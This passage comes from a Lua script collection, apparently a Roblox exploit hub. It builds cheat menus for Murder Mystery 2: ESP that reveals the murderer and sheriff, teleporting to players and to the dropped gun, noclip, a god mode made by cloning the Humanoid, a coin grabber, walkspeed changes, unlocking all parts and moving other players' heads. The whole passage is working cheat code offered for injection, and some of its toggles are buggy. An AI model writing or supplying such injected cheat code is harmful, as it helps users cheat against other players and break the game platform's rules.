Bringgun.BackgroundColor3 = Color3.new(0, 0, 1)
Bringgun.Position = UDim2.new(0.166156977, 0, 0.211999387, 0)
Bringgun.Size = UDim2.new(0, 163, 0, 50)
Bringgun.Font = Enum.Font.SourceSans
Bringgun.Text = "Bring Gun"
Bringgun.TextColor3 = Color3.new(0, 0, 0)
Bringgun.TextScaled = true
Bringgun.TextSize = 14
Bringgun.TextWrapped = true

ToMurderer.Name = "ToMurderer"
ToMurderer.Parent = ScreenGui
ToMurderer.BackgroundColor3 = Color3.new(1, 0.741176, 0.0784314)
ToMurderer.Position = UDim2.new(0.166156977, 0, 0.319503635, 0)
ToMurderer.Size = UDim2.new(0, 163, 0, 50)
ToMurderer.Font = Enum.Font.SourceSans
ToMurderer.Text = "To Murderer"
ToMurderer.TextColor3 = Color3.new(0, 0, 0)
ToMurderer.TextScaled = true
ToMurderer.TextSize = 14
ToMurderer.TextWrapped = true

ToLOBBY.Name = "ToLOBBY"
ToLOBBY.Parent = ScreenGui
ToLOBBY.BackgroundColor3 = Color3.new(1, 1, 1)
ToLOBBY.Position = UDim2.new(0.166156977, 0, 0.425186396, 0)
ToLOBBY.Size = UDim2.new(0, 163, 0, 50)
ToLOBBY.Font = Enum.Font.SourceSans
ToLOBBY.Text = "To Lobby"
ToLOBBY.TextColor3 = Color3.new(0, 0, 0)
ToLOBBY.TextScaled = true
ToLOBBY.TextSize = 14
ToLOBBY.TextWrapped = true

HIDE.Name = "HIDE"
HIDE.Parent = ScreenGui
HIDE.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
HIDE.Position = UDim2.new(0.166156977, 0, 0.724320531, 0)
HIDE.Size = UDim2.new(0, 163, 0, 56)
HIDE.Font = Enum.Font.SourceSans
HIDE.Text = "HIDE"
HIDE.TextColor3 = Color3.new(0, 0, 0)
HIDE.TextScaled = true
HIDE.TextSize = 14
HIDE.TextWrapped = true

OPEN.Name = "OPEN"
OPEN.Parent = ScreenGui
OPEN.Active = false
OPEN.BackgroundColor3 = Color3.new(0.0117647, 1, 0.0117647)
OPEN.Position = UDim2.new(0, 0, 0.0418502204, 0)
OPEN.Size = UDim2.new(0, 116, 0, 19)
OPEN.Visible = false
OPEN.Font = Enum.Font.SourceSans
OPEN.Text = "OPEN"
OPEN.TextColor3 = Color3.new(0, 0, 0)
OPEN.TextScaled = true
OPEN.TextSize = 14
OPEN.TextWrapped = true

ToSherrif.Name = "ToSherrif"
ToSherrif.Parent = ScreenGui
ToSherrif.BackgroundColor3 = Color3.new(1, 0.741176, 0.0784314)
ToSherrif.Position = UDim2.new(0.166156977, 0, 0.533537149, 0)
ToSherrif.Size = UDim2.new(0, 163, 0, 50)
ToSherrif.Font = Enum.Font.SourceSans
ToSherrif.Text = "To Sherrif"
ToSherrif.TextColor3 = Color3.new(0, 0, 0)
ToSherrif.TextScaled = true
ToSherrif.TextSize = 14
ToSherrif.TextWrapped = true

-- Scripts:

local function XVGFY_fake_script() -- ScreenGui.LocalScript
local script = Instance.new('LocalScript', ScreenGui)

-- FUNCTIONS
function murderer()
for i, v in pairs(game.Players:children()) do
if  v.Backpack:findFirstChild("Knife") or v.Character:findFirstChild("Knife") then
return v
end
end
end

function sherrif()
for i, v in pairs(game.Players:children()) do
if  v.Backpack:findFirstChild("Gun") or v.Character:findFirstChild("Gun") then
return v
end
end
end


-- ESP ON BUTTON

script.Parent.ESPon.MouseButton1Down:connect(function()
for i, v in pairs(game.Players:children()) do
if v.Backpack:findFirstChild("Knife") or v.Character:findFirstChild("Knife") then
local esp = Instance.new("BoxHandleAdornment")
esp.Parent = v.Character.Head
esp.Size = Vector3.new(1,1,1)
esp.Color3 = Color3.new(255, 0, 0)
esp.AlwaysOnTop = true
esp.Adornee = v.Character.Head
esp.Visible = true
esp.ZIndex = 2

elseif v.Backpack:findFirstChild("Gun") or v.Character:findFirstChild("Gun") then
local esp = Instance.new("BoxHandleAdornment")
esp.Parent = v.Character.Head
esp.Size = Vector3.new(1,1,1)
esp.Color3 = Color3.new(0, 0, 255)
esp.AlwaysOnTop = true
esp.Adornee = v.Character.Head
esp.Visible = true
esp.ZIndex = 2
else
local esp = Instance.new("BoxHandleAdornment")
esp.Parent = v.Character.Head
esp.Size = Vector3.new(1,1,1)
esp.Color3 = Color3.new(0, 255, 0)
esp.AlwaysOnTop = true
esp.Adornee = v.Character.Head
esp.Visible = true
esp.ZIndex = 2
end

end

end)

-- ESP OFF BUTTON

script.Parent.ESPOff.MouseButton1Down:connect(function()
for i, v in pairs(game.Players:children()) do
for i, a in pairs(v.Character.Head:children()) do
if a.ClassName == "BoxHandleAdornment" then
a:remove()
end
end
end
end)

-- BRING GUN BUTTON

script.Parent.Bringgun.MouseButton1Down:connect(function()
if game.Workspace:FindFirstChild("GunDrop") then
game.Workspace.GunDrop.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
end
end)

-- TO LOBBY BUTTON

script.Parent.ToLOBBY.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Lobby.Radio.CFrame
end)

-- TO Murderer Button

script.parent.ToMurderer.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = murderer().Character.HumanoidRootPart.CFrame
end)


-- TO Sherriff button

script.Parent.ToSherrif.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = sherrif().Character.HumanoidRootPart.CFrame
end)

-- Hide Button

script.Parent.HIDE.MouseButton1Down:connect(function()
for i, v in pairs(script.Parent:children()) do
if v.Name ~= "OPEN" then
v.Visible = false
v.Active = false

else
v.Active = true
v.Visible = true
end
end
end)

-- Open Button

script.Parent.OPEN.MouseButton1Down:connect(function()
for i, v in pairs(script.Parent:children()) do
if v.Name ~= "OPEN" then
v.Visible = true
v.Active = true

else
v.Active = false
v.Visible = false
end
end
end)





end
coroutine.wrap(XVGFY_fake_script)()
end)






Section:NewButton("MM2 GUI 6 ", "This is new", function()

local SlaughterHouse = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Noclip = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local ClickTp = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")
local HeadTp = Instance.new("TextButton")
local TextLabel_3 = Instance.new("TextLabel")
local Sprint = Instance.new("TextButton")
local TextLabel_4 = Instance.new("TextLabel")
local GrabCoins = Instance.new("TextButton")
local God = Instance.new("TextButton")
local TeleportLobby = Instance.new("TextButton")
local GMS = Instance.new("TextButton")
local WS = Instance.new("TextButton")
local BTD = Instance.new("TextButton")
local BTG = Instance.new("TextButton")
local BTC = Instance.new("TextButton")
local BT = Instance.new("TextButton")
local LOCK = Instance.new("TextButton")
local Value = Instance.new("TextBox")
local Open = Instance.new("TextButton")
 
-- Properties
 
SlaughterHouse.Name = "SlaughterHouse"
SlaughterHouse.Parent = game.Players.LocalPlayer.PlayerGui
SlaughterHouse.Enabled = true
SlaughterHouse.ResetOnSpawn = false
 
MainFrame.Name = "MainFrame"
MainFrame.Parent = SlaughterHouse
MainFrame.BackgroundColor3 = Color3.new(0.580392, 0, 0)
MainFrame.BorderColor3 = Color3.new(0.223529, 0.34902, 0.439216)
MainFrame.BorderSizePixel = 4
MainFrame.Position = UDim2.new(0, 800, 0, 200)
MainFrame.Size = UDim2.new(0, 500, 0, 300)
 
Noclip.Name = "Noclip"
Noclip.Parent = MainFrame
Noclip.BackgroundColor3 = Color3.new(0.639216, 0, 0)
Noclip.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
Noclip.BorderSizePixel = 5
Noclip.Position = UDim2.new(0, 350, 0, 75)
Noclip.Size = UDim2.new(0, 25, 0, 25)
Noclip.Font = Enum.Font.SourceSans
Noclip.Text = ""
Noclip.TextColor3 = Color3.new(1, 1, 1)
Noclip.TextSize = 14
 
TextLabel.Parent = Noclip
TextLabel.BackgroundColor3 = Color3.new(0.666667, 0, 0)
TextLabel.BorderSizePixel = 2
TextLabel.Position = UDim2.new(0, 35, 0, 0)
TextLabel.Size = UDim2.new(0, 75, 0, 25)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "Noclip [F]"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextScaled = true
TextLabel.TextSize = 50
TextLabel.TextWrapped = true
 
ClickTp.Name = "ClickTp"
ClickTp.Parent = MainFrame
ClickTp.BackgroundColor3 = Color3.new(0.639216, 0, 0)
ClickTp.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
ClickTp.BorderSizePixel = 5
ClickTp.Position = UDim2.new(0, 350, 0, 125)
ClickTp.Size = UDim2.new(0, 25, 0, 25)
ClickTp.Font = Enum.Font.SourceSans
ClickTp.Text = ""
ClickTp.TextColor3 = Color3.new(1, 1, 1)
ClickTp.TextSize = 14
 
TextLabel_2.Parent = ClickTp
TextLabel_2.BackgroundColor3 = Color3.new(0.666667, 0, 0)
TextLabel_2.BorderSizePixel = 2
TextLabel_2.Position = UDim2.new(0, 35, 0, 0)
TextLabel_2.Size = UDim2.new(0, 75, 0, 25)
TextLabel_2.Font = Enum.Font.SourceSansBold
TextLabel_2.Text = "ClickTp [R]"
TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 50
TextLabel_2.TextWrapped = true
 
HeadTp.Name = "HeadTp"
HeadTp.Parent = MainFrame
HeadTp.BackgroundColor3 = Color3.new(0.639216, 0, 0)
HeadTp.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
HeadTp.BorderSizePixel = 5
HeadTp.Position = UDim2.new(0, 350, 0, 25)
HeadTp.Size = UDim2.new(0, 25, 0, 25)
HeadTp.Font = Enum.Font.SourceSans
HeadTp.Text = ""
HeadTp.TextColor3 = Color3.new(1, 1, 1)
HeadTp.TextSize = 14
 
TextLabel_3.Parent = HeadTp
TextLabel_3.BackgroundColor3 = Color3.new(0.666667, 0, 0)
TextLabel_3.BorderSizePixel = 2
TextLabel_3.Position = UDim2.new(0, 35, 0, 0)
TextLabel_3.Size = UDim2.new(0, 100, 0, 25)
TextLabel_3.Font = Enum.Font.SourceSansBold
TextLabel_3.Text = "Head Tp [Tab]"
TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 50
TextLabel_3.TextWrapped = true
 
Sprint.Name = "Sprint"
Sprint.Parent = MainFrame
Sprint.BackgroundColor3 = Color3.new(0.639216, 0, 0)
Sprint.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
Sprint.BorderSizePixel = 5
Sprint.Position = UDim2.new(0, 350, 0, 175)
Sprint.Size = UDim2.new(0, 25, 0, 25)
Sprint.Font = Enum.Font.SourceSans
Sprint.Text = ""
Sprint.TextColor3 = Color3.new(1, 1, 1)
Sprint.TextSize = 14
 
TextLabel_4.Parent = Sprint
TextLabel_4.BackgroundColor3 = Color3.new(0.666667, 0, 0)
TextLabel_4.BorderSizePixel = 2
TextLabel_4.Position = UDim2.new(0, 35, 0, 0)
TextLabel_4.Size = UDim2.new(0, 100, 0, 25)
TextLabel_4.Font = Enum.Font.SourceSansBold
TextLabel_4.Text = "Sprint[SHIFT]"
TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 50
TextLabel_4.TextWrapped = true
 
GrabCoins.Name = "GrabCoins"
GrabCoins.Parent = MainFrame
GrabCoins.BackgroundColor3 = Color3.new(0.639216, 0, 0)
GrabCoins.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
GrabCoins.BorderSizePixel = 4
GrabCoins.Position = UDim2.new(0, 10, 0, 20)
GrabCoins.Size = UDim2.new(0, 150, 0, 35)
GrabCoins.Font = Enum.Font.SourceSans
GrabCoins.Text = "Grab Coins"
GrabCoins.TextColor3 = Color3.new(1, 1, 1)
GrabCoins.TextScaled = true
GrabCoins.TextSize = 14
GrabCoins.TextWrapped = true
 
God.Name = "God"
God.Parent = MainFrame
God.BackgroundColor3 = Color3.new(0.639216, 0, 0)
God.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
God.BorderSizePixel = 4
God.Position = UDim2.new(0, 10, 0, 70)
God.Size = UDim2.new(0, 150, 0, 35)
God.Font = Enum.Font.SourceSans
God.Text = "God Mode"
God.TextColor3 = Color3.new(1, 1, 1)
God.TextScaled = true
God.TextSize = 14
God.TextWrapped = true
 
TeleportLobby.Name = "TeleportLobby"
TeleportLobby.Parent = MainFrame
TeleportLobby.BackgroundColor3 = Color3.new(0.639216, 0, 0)
TeleportLobby.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
TeleportLobby.BorderSizePixel = 4
TeleportLobby.Position = UDim2.new(0, 10, 0, 120)
TeleportLobby.Size = UDim2.new(0, 150, 0, 35)
TeleportLobby.Font = Enum.Font.SourceSans
TeleportLobby.Text = "Tp To Lobby"
TeleportLobby.TextColor3 = Color3.new(1, 1, 1)
TeleportLobby.TextScaled = true
TeleportLobby.TextSize = 14
TeleportLobby.TextWrapped = true
 
GMS.Name = "GMS"
GMS.Parent = MainFrame
GMS.BackgroundColor3 = Color3.new(0.639216, 0, 0)
GMS.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
GMS.BorderSizePixel = 4
GMS.Position = UDim2.new(0, 10, 0, 170)
GMS.Size = UDim2.new(0, 150, 0, 35)
GMS.Font = Enum.Font.SourceSans
GMS.Text = "Get Murderer And Sheriff"
GMS.TextColor3 = Color3.new(1, 1, 1)
GMS.TextScaled = true
GMS.TextSize = 14
GMS.TextWrapped = true
 
WS.Name = "WS"
WS.Parent = MainFrame
WS.BackgroundColor3 = Color3.new(0.639216, 0, 0)
WS.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
WS.BorderSizePixel = 4
WS.Position = UDim2.new(0, 10, 0, 220)
WS.Size = UDim2.new(0, 150, 0, 35)
WS.Font = Enum.Font.SourceSans
WS.Text = "Walkspeed"
WS.TextColor3 = Color3.new(1, 1, 1)
WS.TextScaled = true
WS.TextSize = 14
WS.TextWrapped = true
 
BTD.Name = "BTD"
BTD.Parent = MainFrame
BTD.BackgroundColor3 = Color3.new(0.639216, 0, 0)
BTD.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
BTD.BorderSizePixel = 4
BTD.Position = UDim2.new(0, 180, 0, 170)
BTD.Size = UDim2.new(0, 150, 0, 35)
BTD.Font = Enum.Font.SourceSans
BTD.Text = "Delete Tool"
BTD.TextColor3 = Color3.new(1, 1, 1)
BTD.TextScaled = true
BTD.TextSize = 14
BTD.TextWrapped = true
 
BTG.Name = "BTG"
BTG.Parent = MainFrame
BTG.BackgroundColor3 = Color3.new(0.639216, 0, 0)
BTG.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
BTG.BorderSizePixel = 4
BTG.Position = UDim2.new(0, 180, 0, 20)
BTG.Size = UDim2.new(0, 150, 0, 35)
BTG.Font = Enum.Font.SourceSans
BTG.Text = "Grab Tool"
BTG.TextColor3 = Color3.new(1, 1, 1)
BTG.TextScaled = true
BTG.TextSize = 14
BTG.TextWrapped = true
 
BTC.Name = "BTC"
BTC.Parent = MainFrame
BTC.BackgroundColor3 = Color3.new(0.639216, 0, 0)
BTC.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
BTC.BorderSizePixel = 4
BTC.Position = UDim2.new(0, 180, 0, 70)
BTC.Size = UDim2.new(0, 150, 0, 35)
BTC.Font = Enum.Font.SourceSans
BTC.Text = "Clone Tool"
BTC.TextColor3 = Color3.new(1, 1, 1)
BTC.TextScaled = true
BTC.TextSize = 14
BTC.TextWrapped = true
 
BT.Name = "BT"
BT.Parent = MainFrame
BT.BackgroundColor3 = Color3.new(0.639216, 0, 0)
BT.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
BT.BorderSizePixel = 4
BT.Position = UDim2.new(0, 180, 0, 120)
BT.Size = UDim2.new(0, 150, 0, 35)
BT.Font = Enum.Font.SourceSans
BT.Text = "Btools"
BT.TextColor3 = Color3.new(1, 1, 1)
BT.TextScaled = true
BT.TextSize = 14
BT.TextWrapped = true
 
LOCK.Name = "LOCK"
LOCK.Parent = MainFrame
LOCK.BackgroundColor3 = Color3.new(0.639216, 0, 0)
LOCK.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
LOCK.BorderSizePixel = 4
LOCK.Position = UDim2.new(0, 180, 0, 220)
LOCK.Size = UDim2.new(0, 150, 0, 35)
LOCK.Font = Enum.Font.SourceSans
LOCK.Text = "Unlock All"
LOCK.TextColor3 = Color3.new(1, 1, 1)
LOCK.TextScaled = true
LOCK.TextSize = 14
LOCK.TextWrapped = true
 
Value.Name = "Value"
Value.Parent = MainFrame
Value.BackgroundColor3 = Color3.new(0.639216, 0, 0)
Value.BorderColor3 = Color3.new(0.176471, 0.27451, 0.345098)
Value.BorderSizePixel = 4
Value.Position = UDim2.new(0, 340, 0, 220)
Value.Size = UDim2.new(0, 150, 0, 35)
Value.Font = Enum.Font.SourceSans
Value.Text = "Value"
Value.TextColor3 = Color3.new(1, 1, 1)
Value.TextScaled = true
Value.TextSize = 14
Value.TextWrapped = true
 
Open.Name = "Open"
Open.Parent = SlaughterHouse
Open.BackgroundColor3 = Color3.new(1, 1, 1)
Open.BorderSizePixel = 4
Open.Position = UDim2.new(0, 0, 0, 500)
Open.Size = UDim2.new(0, 100, 0, 25)
Open.Visible = false
Open.Font = Enum.Font.SourceSans
Open.Text = "Open"
Open.TextScaled = true
Open.TextSize = 14
Open.TextWrapped = true
 
 
 
Player = game.Players.LocalPlayer
Mouse = Player:GetMouse()
UserInputService = game:GetService('UserInputService')
noclip = false
ctp = false
headTp = false
sprint = false
 
 
Noclip.MouseButton1Down:connect(function()
    print("hi")
    if noclip == false then
        noclip = true
        Noclip.BackgroundColor3 = Color3.new(0, 0, 0)
    else
        noclip = false
        Noclip.BackgroundColor3 = MainFrame.BackgroundColor3
 
    end
end)
 
   
ClickTp.MouseButton1Click:connect(function()
    if ctp == false then
        ctp = true
        ClickTp.BackgroundColor3 = Color3.new(0, 0, 0)
    else
        ctp = false
    ClickTp.BackgroundColor3 = MainFrame.BackgroundColor3
    end
end)
 
HeadTp.MouseButton1Click:connect(function()
    if headTp == false then
        headTp = true
        script.Parent.HeadTp.BackgroundColor3 = Color3.new(0, 0, 0)
    else
        headTp = false
    script.Parent.HeadTp.BackgroundColor3 = MainFrame.BackgroundColor3
    end
end)
 
 
 
BTD.MouseButton1Click:connect(function()
local tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
tool.BinType = "Hammer"
end)
 
 
BTC.MouseButton1Click:connect(function()
local tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
tool.BinType = "Clone"
end)
 
 
BTG.MouseButton1Click:connect(function()
local tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
tool.BinType = "GameTool"
end)
 
 
BT.MouseButton1Click:connect(function()
local tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
tool.BinType = "Hammer"
local tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
tool.BinType = "Clone"
 
local tool = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
tool.BinType = "GameTool"
end)
 
WS.MouseButton1Click:connect(function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = tonumber(script.Parent.Value.Text)
end)
 
 
LOCK.MouseButton1Click:connect(function()
function unlockParts(root)
for _,v in pairs(root:GetChildren()) do
if v:IsA("Part") then
v.Locked = false
end
unlockParts(v)
end
end
unlockParts(game.Workspace)
end)
 
TeleportLobby.MouseButton1Click:connect(function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-109.56, 150, -11.75))
end)
   
GrabCoins.MouseButton1Down:connect(function()
for i,v in pairs(game.Workspace:GetChildren()) do
local f = v:FindFirstChild("CoinContainer")
local q = game.Players.LocalPlayer.Character:FindFirstChild("Torso")
if q and f then
for i,c in pairs(f:GetChildren()) do
c.CFrame = game.Players.LocalPlayer.Character.Torso.CFrame
end
end
end
end)
   
God.MouseButton1Down:connect(function()
        game.Players.LocalPlayer.Character.Humanoid.Name = 1
local l = game.Players.LocalPlayer.Character["1"]:Clone()
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait(0.1)
game.Players.LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait(0.1)
game.Players.LocalPlayer.Character.Animate.Disabled = false
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
end)
 
GMS.MouseButton1Down:connect(function()
    local Players = game.Players:GetChildren()
for i,v in pairs(Players) do
 
if v:FindFirstChild("Backpack") or v:FindFirstChild("Character")then
   
if v.Backpack:FindFirstChild("Knife") or v.Character:FindFirstChild("Knife") then
   
   
local BBG = Instance.new("BillboardGui")
--[[BBG.Adornee = BBG.Parent
BBG.Size = UDim2.new(0, 25, 0, 25)
BBG.AlwaysOnTop = true
local BBGF = Instance.new("Frame", BBG)
BBGF.Size = UDim2.new(0, 25, 0, 25)
BBGF.BackgroundColor3 = Color3.new(255, 0, 0)]]
 
        BBG.Parent = v.Character.Head
        BBG.Adornee = v.Character.Head
        BBG.Size = UDim2.new(2, 0, 1, 0)
        BBG.StudsOffset = Vector3.new(-2.5, 6, 0)
        local text = Instance.new("TextLabel", BBG)
        text.Text = "Murderer"
        text.Size = UDim2.new(4, 0, 8, 0)
        text.Position = UDim2.new(0, 0, 0, 0)
        text.TextScaled = true
        text.TextColor3 = Color3.new(255, 0, 0)
        text.BackgroundTransparency = 1
 
 
end
 
end
end
 
 
for i,v in pairs(Players) do
 
if v:FindFirstChild("Backpack") or v:FindFirstChild("Character")then
   
if v.Backpack:FindFirstChild("Revolver") or v.Character:FindFirstChild("Revolver") then
   
   
local BBG = Instance.new("BillboardGui")
--[[BBG.Adornee = BBG.Parent
BBG.Size = UDim2.new(0, 25, 0, 25)
BBG.AlwaysOnTop = true
local BBGF = Instance.new("Frame", BBG)
BBGF.Size = UDim2.new(0, 25, 0, 25)
BBGF.BackgroundColor3 = Color3.new(255, 0, 0)]]
 
        BBG.Parent = v.Character.Head
        BBG.Adornee = v.Character.Head
        BBG.Size = UDim2.new(2, 0, 1, 0)
        BBG.StudsOffset = Vector3.new(-2.5, 6, 0)
        local text = Instance.new("TextLabel", BBG)
        text.Text = "Sheriff"
        text.Size = UDim2.new(4, 0, 8, 0)
        text.Position = UDim2.new(0, 0, 0, 0)
        text.TextScaled = true
        text.TextColor3 = Color3.new(0, 0, 255)
        text.BackgroundTransparency = 1
       
 
end
 
end
end
end)
   
           
Sprint.MouseButton1Click:connect(function()
    if sprint == false then
    sprint = true
    Sprint.BackgroundColor3 = Color3.new(0, 0, 0)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
    else
    sprint = false
    Sprint.BackgroundColor3 = MainFrame.BackgroundColor3
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
    end
end)
 
 
wait()
 
game.Players.LocalPlayer.Character.HumanoidRootPart.Touched:connect(function(part)
    if noclip == true then
        part.CanCollide = false
        wait(1)
        part.CanCollide = true
    end
end)
 
game.Players.LocalPlayer.Character.Humanoid.Died:connect(function()
    wait(6)
game.Players.LocalPlayer.Character.HumanoidRootPart.Touched:connect(function(part)
    if Noclip == true then
        part.CanCollide = false
        wait(1)
        part.CanCollide = true
    end
end)
end)
 
 
 
 
------------------Hotkeys---------------------
 
UserInputService.InputBegan:connect(function(Input, Processed)
   
if Input.UserInputType == Enum.UserInputType.Keyboard then
if Input.KeyCode == Enum.KeyCode.F then
if noclip == false then
    noclip = true
    Noclip.BackgroundColor3 = Color3.new(0, 0, 0)
else
    noclip = false
    Noclip.BackgroundColor3 = MainFrame.BackgroundColor3
end
end
if Input.KeyCode == Enum.KeyCode.R then
if ctp == false then
    ctp = true
    ClickTp.BackgroundColor3 = Color3.new(0, 0, 0)
else
    ctp = false
    ClickTp.BackgroundColor3 = MainFrame.BackgroundColor3
end
end
 
 
 
if Input.KeyCode == Enum.KeyCode.Tab then
if headTp == false then
    headTp = true
    HeadTp.BackgroundColor3 = Color3.new(0, 0, 0)
else
    headTp = false
    HeadTp.BackgroundColor3 = MainFrame.BackgroundColor3
end
end
 
if Input.KeyCode == Enum.KeyCode.LeftShift then
if sprint == false then
    sprint = true
    Sprint.BackgroundColor3 = Color3.new(0, 0, 0)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
else
    sprint = false
    Sprint.BackgroundColor3 = MainFrame.BackgroundColor3
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
end
end
 
 
 
end
end)
 
 
 
-------------------------------------------
 
 
 

Mouse.Button1Down:connect(function()
if  ctp == true then
Player.Character:MoveTo(Mouse.Hit.p)
end
end)
 
for i = 1, math.huge, 1 do
wait(0.5)
for i,v in pairs(game.Players:GetChildren())do
    if v.Name ~= game.Players.LocalPlayer.Name and HeadTp == true then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-109.56, 150, -11.75))
v.Character.Head.Position = game.Players.LocalPlayer.Character.Head.Position + Vector3.new(0,-1,2)
end
end
end
end)

Section:NewButton("MM2 GUI 7 ", "PC noice", function()
if game.PlaceId == 142823291 then --Proofing just because ;)
--Note: Don't reset with godmode on or you will be stuck on a black screen for a reasonable amount of time
--Change to false if you dont like printing to console
local printvar = true
--Change to true if you want to see names instead of murderer, sheriff, and innocents with esp
local espnames = true
--Change keybinds to your liking
local coinkey = "c" --Coin grabber keybind
local MSkey = "m" --Murderer/Sheriff esp keybind
local playerskey = "q" --All players esp keybind
local espoffkey = "b" --Turn esp off keybind
local flykey = "f" --Fly keybind
local noclipkey = "r" --Noclip keybind
local godmodekey = "g" --Godmode keybind
local xrayonkey = "x" --Xray on keybind
local xrayoffkey = "z" --Xray off keybind
local bringgunkey = "t" --Teleport to gun keybind
local hideshowguikey = "p" --Show/Hide gui keybind
--End of easy customization options

--Gui Buttons and Status--
local MM2 = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Coin = Instance.new("TextButton")
local MSEsp = Instance.new("TextButton")
local MSESPActive = Instance.new("TextLabel")
local PlayersEsp = Instance.new("TextButton")
local PlayersEspActive = Instance.new("TextLabel")
local EspOff = Instance.new("TextButton")
local EspOffActive = Instance.new("TextLabel")
local Run = Instance.new("TextButton")
local RunActiveGui = Instance.new("TextLabel")
local Fly = Instance.new("TextButton")
local FlyActive = Instance.new("TextLabel")
local Noclip = Instance.new("TextButton")
local NoclipActive = Instance.new("TextLabel")
local GodMode = Instance.new("TextButton")
local GodModeActive = Instance.new("TextLabel")
local GuiXrayOn = Instance.new("TextButton")
local GuiXrayOnActive = Instance.new("TextLabel")
local GuiXrayOff = Instance.new("TextButton")
local GuiXrayOffActive = Instance.new("TextLabel")
local BringGun = Instance.new("TextButton")
local Keybinds = Instance.new("TextButton")
local KeybindsActive = Instance.new("TextLabel")
local Hide = Instance.new("TextButton")
local Show = Instance.new("TextButton")

--Other Variables
local runActive = false
local teamname = "None"
local murderer = "None"
local sheriff = "None"
local player = game:GetService("Players").LocalPlayer

local esp = false
local plresp
local track = false

local NClip = false
local char = game.Players.LocalPlayer.Character
local obj = game.workspace
local mouse=game.Players.LocalPlayer:GetMouse()
local LP = game:GetService("Players").LocalPlayer
local flyvar = false

local showvar = true
local inputcode = game:GetService("UserInputService")
local godmodevar = false
local keyOff = false
local NClip = false

--Start of Gui--
MM2.Name = "MM2"
MM2.Parent = game.CoreGui
MM2.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = MM2
Main.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Main.BorderColor3 = Color3.new(0, 0.607843, 1)
Main.BorderSizePixel = 5
Main.Draggable = true
Main.Position = UDim2.new(0.574999988, 0, 0.349999994, 0)
Main.Size = UDim2.new(0.2, 0, 0.4, 0)
Main.Visible = true
Main.Active = true

Title.Name = "Title"
Title.Parent = Main
Title.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Title.BorderColor3 = Color3.new(0, 0.607843, 1) 
Title.BorderSizePixel = 5
Title.Draggable = true
Title.Size = UDim2.new(1.005, 0, 0.2, 0)
Title.ZIndex = 3
Title.Font = Enum.Font.SciFi
Title.FontSize = Enum.FontSize.Size24
Title.Text = "Murder Mystery 2"
Title.TextColor3 = Color3.new(0, 0.607843, 1)
Title.TextScaled = true
Title.TextSize = 20
Title.TextStrokeColor3 = Color3.new(0.129412, 0.54902, 1)
Title.TextWrapped = true

--Start of functions for buttons--
function Create(base, team, colors1, colors2, colors3, teamname) --For all esps
	local bb = Instance.new("BillboardGui",player.PlayerGui)
	bb.Adornee = base
	bb.ExtentsOffset = Vector3.new(0,1,0)
	bb.AlwaysOnTop = true
	bb.Size = UDim2.new(0,5,0,5)
	bb.StudsOffset = Vector3.new(0,1,0)
	bb.Name = "tracker"
	local frame = Instance.new("Frame",bb)
	frame.ZIndex = 10
	frame.BackgroundTransparency = 0.3
	frame.Size = UDim2.new(1,0,1,0)
	local txtlbl = Instance.new("TextLabel",bb)
	txtlbl.ZIndex = 10
	txtlbl.Text = teamname
	txtlbl.BackgroundTransparency = 1
	txtlbl.Position = UDim2.new(0,0,0,-35)
	txtlbl.Size = UDim2.new(1,0,10,0)
	txtlbl.Font = "ArialBold"
	txtlbl.FontSize = "Size12"
	txtlbl.TextStrokeTransparency = 0.5
